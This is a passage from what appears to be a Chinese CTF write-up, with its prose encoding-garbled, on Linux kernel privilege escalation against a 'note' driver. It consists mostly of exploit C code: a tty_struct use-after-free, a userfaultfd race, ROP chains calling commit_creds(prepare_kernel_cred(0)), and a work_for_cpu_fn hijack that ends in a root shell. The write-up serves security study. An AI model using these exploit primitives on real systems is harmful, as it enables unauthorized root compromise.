class="number">10</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">memcpy</span>(fake_tty_struct,tty_struct,<span class="number">0x50</span>);</span><br><span class="line">    <span class="keyword">size_t</span> rop[<span class="number">64</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    fake_tty_struct[<span class="number">3</span>]=fake_tty_ops_addr;</span><br><span class="line">    fake_tty_struct[<span class="number">1</span>]=pop_rsp_ret-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">    fake_tty_struct[<span class="number">2</span>]=rop_addr;</span><br><span class="line"></span><br><span class="line">    ((struct tty_operations *)fake_tty_ops)-&gt;write=push_rdi_pop_rsp_pop_rbp_or_eax_edx_ret-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">    rop[i++]=pop_rdi_ret-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">    rop[i++]=<span class="number">0</span>;</span><br><span class="line">    rop[i++]=prepare_kernel_cred-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">    rop[i++]=MOV_RDI_RAX_POP_RBP_RET-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">    rop[i++]=<span class="number">0</span>;</span><br><span class="line">    rop[i++]=commit_creds-vmlinux_nokaslr_addr+kernel_base;</span><br><span class="line">    rop[i++]=swapgs_restore_regs_and_return_to_usermode_addr+<span class="number">22</span>;</span><br><span class="line">    rop[i++]=<span class="number">0</span>;</span><br><span class="line">    rop[i++]=<span class="number">0</span>;</span><br><span class="line">    rop[i++]=(<span class="keyword">size_t</span>)&amp;usr_shell;</span><br><span class="line">    rop[i++]=user_cs;</span><br><span class="line">    rop[i++]=user_rflags;</span><br><span class="line">    rop[i++]=user_sp;</span><br><span class="line">    rop[i++]=user_ss;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    write(note_fd,fake_tty_ops,fake_tty_ops_idx);</span><br><span class="line">    write(note_fd,rop,rop_idx);</span><br><span class="line">    write(note_fd,fake_tty_struct,uaf_tty);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;getshell :%p\n&quot;</span>,usr_shell);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x100</span>;i++)&#123;</span><br><span class="line">        write(tty_fd[i],name,<span class="number">0x100</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="è§£æ³•äºŒï¼šuserfaultfd-uaf-tty-struct-work-for-cpu-fn"><a href="#è§£æ³•äºŒï¼šuserfaultfd-uaf-tty-struct-work-for-cpu-fn" class="headerlink" title="è§£æ³•äºŒï¼šuserfaultfd+uaf+tty_struct+work_for_cpu_fn"></a><strong>è§£æ³•äºŒ</strong>ï¼šuserfaultfd+uaf+tty_struct+work_for_cpu_fn</h4><p>åœ¨å¼€å¯äº†å¤šæ ¸æ”¯æŒçš„å†…æ ¸ä¸­éƒ½ä¼šæœ‰è¿™ä¸ª<code>work_for_cpu_fn</code>,å®ƒå°±ç›¸å½“äºä¸€ä¸ªgadget,æ‰§è¡Œrdi+0x20,å‚æ•°æ˜¯rdi+0x28,æŠŠè¿”å›å€¼ä¿å­˜åœ¨rdi+0x30çš„åœ°æ–¹,å‡å¦‚æˆ‘æ§åˆ¶<code>tty_struct</code>çš„<code>tty_operations</code>çš„çš„<code>ioctl</code>å‡½æ•°æŒ‡é’ˆä¸º<code>work_for_cpu_fn</code>ï¼Œåœ¨è°ƒç”¨<code>ioctl(tty_fd,0x200,0x200)</code>å°±ä¼šè°ƒç”¨<code>tty_operations</code>çš„<code>ioctl</code>ä¹Ÿå°±æ˜¯<code>work_for_cpu_fn</code>å‡½æ•°ï¼Œæ­¤æ—¶rdiå°±æ˜¯tty_struct,è€Œæ­¤æ—¶tty_structèƒ½åŠ«æŒçš„è¯å°±èƒ½ä»»æ„å‡½æ•°æ‰§è¡Œäº†ï¼Œæˆ‘ä»¬å¯ä»¥æ‰§è¡Œ<code>prepare_kernel_cred(0)</code>ç„¶åæŠŠè¿”å›å€¼å­˜å‚¨åœ¨<code>tty_struct+0x30</code>çš„åœ°æ–¹ï¼Œæ‰§è¡Œå®Œ<code>work_for_cpu_fn</code>ä¹‹åå†…æ ¸è‡ªåŠ¨è¿”å›ç”¨æˆ·æ€ï¼Œå°±ä¸ç”¨æˆ‘ä»¬è‡ªå·±æ„é€ äº†ï¼Œç„¶åå†æ‰§è¡Œä¸€æ¬¡<code>commit_creds(tty_struct+0x30)</code>å°±å¯ä»¥å¾—åˆ°rootæƒé™äº†ï¼Œæœ€åè¿”å›ç”¨æˆ·æ€æ‰§è¡Œ<code>system(&quot;/bin/sh&quot;)</code>;</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">work_for_cpu</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">work</span>;</span></span><br><span class="line">    <span class="keyword">long</span> (*fn)(<span class="keyword">void</span> *);</span><br><span class="line">    <span class="keyword">void</span> *arg;</span><br><span class="line">    <span class="keyword">long</span> ret;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">work_for_cpu_fn</span><span class="params">(struct work_struct *work)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_for_cpu</span> *<span class="title">wfc</span> =</span> container_of(work, struct work_for_cpu, work);</span><br><span class="line"></span><br><span class="line">    wfc-&gt;ret = wfc-&gt;fn(wfc-&gt;arg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/tty.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> tty_struct_size 0x2e0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ptm_unix98_ops_offset 0xe8e440</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pty_unix98_ops_offset 0xe8e320</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> push_rdi_pop_rsp_pop_rbp_add_rax_rdx_ret 0xffffffff81238d50</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> push_rdx_add_byte_r11_0x41_r11b_pop_rsp_pop_rbp_ret 0xffffffff8170dd41</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> commit_creds 0xffffffff810a9b40</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> init_cred 0xffffffff8225c940</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> swapgs_restore_regs_and_return_to_usermode 0xffffffff81a00929</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pop_rdi_ret 0xffffffff81007115</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pop_rdx_pop_rbp_ret   0xffffffff8103658c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> push_rdi_pop_rsp_pop_rbp_or_eax_edx_ret   0xffffffff8143f4e1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pop_rsp_ret 0xffffffff810bc110</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ret 0xffffffff81000091</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> prepare_kernel_cred 0xffffffff810a9ef0 </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> mov_rdi_rax_call_rdx  0xffffffff8270747f</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pop_rdx_ret 0xffffffff81358842</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MOV_RDI_RAX_POP_RBP_RET 0xffffffff81045833</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> work_for_cpu_fn 0xffffffff8109eb90</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> vmlinux_nokaslr_addr=<span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="keyword">size_t</span> kernel_base=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> user_cs,user_ss,user_rflags,user_sp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">saveStatus</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">usr_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;getshelling&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(getuid()==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]----getshell ok&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] getshell fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *page;</span><br><span class="line"><span class="keyword">size_t</span> page_size;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">pthread_t</span> monitor_thread;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">errExit</span><span class="params">(<span class="keyword">char</span> *msg)</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">registerUserFaultFd</span><span class="params">(<span class="keyword">void</span> * addr, <span class="keyword">unsigned</span> <span class="keyword">long</span> len, <span class="keyword">void</span> (*handler)(<span class="keyword">void</span>*))</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> uffd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">uffdio_api</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">uffdio_register</span>;</span></span><br><span class="line">    <span class="keyword">int</span> s;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Create and enable userfaultfd object */</span></span><br><span class="line">    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    <span class="keyword">if</span> (uffd == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;userfaultfd&quot;</span>);</span><br><span class="line"></span><br><span class="line">    uffdio_api.api = UFFD_API;</span><br><span class="line">    uffdio_api.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"></span><br><span class="line">    uffdio_register.range.start = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) addr;</span><br><span class="line">    uffdio_register.range.len = len;</span><br><span class="line">    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line"></span><br><span class="line">    s = pthread_create(&amp;monitor_thread, <span class="literal">NULL</span>, handler, (<span class="keyword">void</span> *) uffd);</span><br><span class="line">    <span class="keyword">if</span> (s != <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;pthread_create&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *page;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *</span></span><br><span class="line"><span class="function"><span class="title">fault_handler_thread</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="keyword">int</span> fault_cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">long</span> uffd;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line">    <span class="keyword">ssize_t</span> nread;</span><br><span class="line"></span><br><span class="line">    uffd = (<span class="keyword">long</span>) arg;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        <span class="keyword">int</span> nready;</span><br><span class="line">        pollfd.fd = uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nready == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;poll&quot;</span>);</span><br><span class="line"></span><br><span class="line">        nread = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line"></span><br><span class="line">        sleep(<span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;EOF on userfaultfd!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;read&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)</span><br><span class="line">            errExit(<span class="string">&quot;Unexpected event on userfaultfd\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        uffdio_copy.src = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) page;</span><br><span class="line">        uffdio_copy.dst = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) msg.arg.pagefault.address &amp;</span><br><span class="line">                                              ~(page_size - <span class="number">1</span>);</span><br><span class="line">        uffdio_copy.len = page_size;</span><br><span class="line">        uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">        uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;ioctl-UFFDIO_COPY&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> idx;</span><br><span class="line">    <span class="keyword">size_t</span> size;</span><br><span class="line">    <span class="keyword">char</span> * buf;</span><br><span class="line">&#125;Userarg;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> note_fd;</span><br><span class="line"><span class="keyword">char</span> *userfaultfd_buf;</span><br><span class="line"><span class="keyword">size_t</span> page_size;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> note_fd,<span class="keyword">size_t</span> idx,<span class="keyword">size_t</span> size,<span class="keyword">char</span> *buf)</span></span>&#123;</span><br><span class="line">    Userarg userarg=&#123;</span><br><span class="line">        .idx=idx,</span><br><span class="line">        .buf=buf,</span><br><span class="line">        .size=size</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(note_fd,<span class="number">0x100</span>,&amp;userarg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">edit</span><span class="params">(<span class="keyword">int</span> note_fd,<span class="keyword">size_t</span> idx,<span class="keyword">size_t</span> size,<span class="keyword">char</span> *buf)</span></span>&#123;</span><br><span class="line">    Userarg userarg=&#123;</span><br><span class="line">        .idx=idx,</span><br><span class="line">        .buf=buf,</span><br><span class="line">        .size=size</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(note_fd,<span class="number">0x300</span>,&amp;userarg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">gift</span><span class="params">(<span class="keyword">int</span> note_fd,<span class="keyword">char</span> *buf)</span></span>&#123;</span><br><span class="line">    Userarg useraeg=&#123;</span><br><span class="line">        .buf=buf</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(note_fd,<span class="number">0x64</span>,&amp;useraeg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">edit_userfaultfd</span><span class="params">(<span class="keyword">int</span> idx)</span></span>&#123;</span><br><span class="line">    edit(note_fd,idx,<span class="number">0x2000</span>,userfaultfd_buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add_userfaultfd</span><span class="params">(<span class="keyword">int</span> idx)</span></span>&#123;</span><br><span class="line">    add(note_fd,idx,<span class="number">0x50</span>,userfaultfd_buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_driver</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">serial_icounter_struct</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> * (*<span class="title">lookup</span>)(<span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>,</span></span><br><span class="line"><span class="class">            <span class="keyword">struct</span> <span class="title">file</span> *<span class="title">filp</span>, <span 